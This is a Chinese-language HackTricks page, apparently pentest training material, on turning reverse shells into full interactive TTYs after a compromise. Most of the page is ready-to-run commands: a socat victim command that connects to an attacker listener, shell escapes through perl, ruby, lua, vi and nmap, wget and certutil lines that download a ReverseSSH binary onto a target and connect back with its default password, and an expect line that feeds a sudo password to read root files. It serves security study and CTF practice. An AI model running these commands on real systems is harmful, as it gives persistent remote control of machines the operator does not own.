# 完整 TTYs

{{#include ../../banners/hacktricks-training.md}}

## 完整 TTY

请注意，您在 `SHELL` 变量中设置的 shell **必须** 在 _**/etc/shells**_ 中 **列出**，否则会出现 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`。此外，请注意，以下代码片段仅在 bash 中有效。如果您在 zsh 中，请在获取 shell 之前通过运行 `bash` 切换到 bash。

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> 您可以通过执行 **`stty -a`** 获取 **行** 和 **列** 的 **数量**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **生成shell**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

一种方便的**交互式shell访问**、**文件传输**和**端口转发**的方法是将静态链接的ssh服务器[ReverseSSH](https://github.com/Fahrj/reverse-ssh)放到目标上。

以下是针对`x86`的示例，使用了upx压缩的二进制文件。有关其他二进制文件，请查看[发布页面](https://github.com/Fahrj/reverse-ssh/releases/latest/)。

1. 在本地准备以捕获ssh端口转发请求：
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux 目标：
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 目标（对于早期版本，请查看 [project readme](https://github.com/Fahrj/reverse-ssh#features)）：
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- 如果 ReverseSSH 端口转发请求成功，您现在应该能够使用默认密码 `letmeinbrudipls` 登录，前提是以运行 `reverse-ssh(.exe)` 的用户身份：
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) 自动将 Linux 反向 shell 升级为 TTY，处理终端大小，记录所有内容等等。它还为 Windows shell 提供 readline 支持。

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

如果由于某种原因您无法获得完整的 TTY，您 **仍然可以与期望用户输入的程序交互**。在以下示例中，密码被传递给 `sudo` 以读取文件：
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
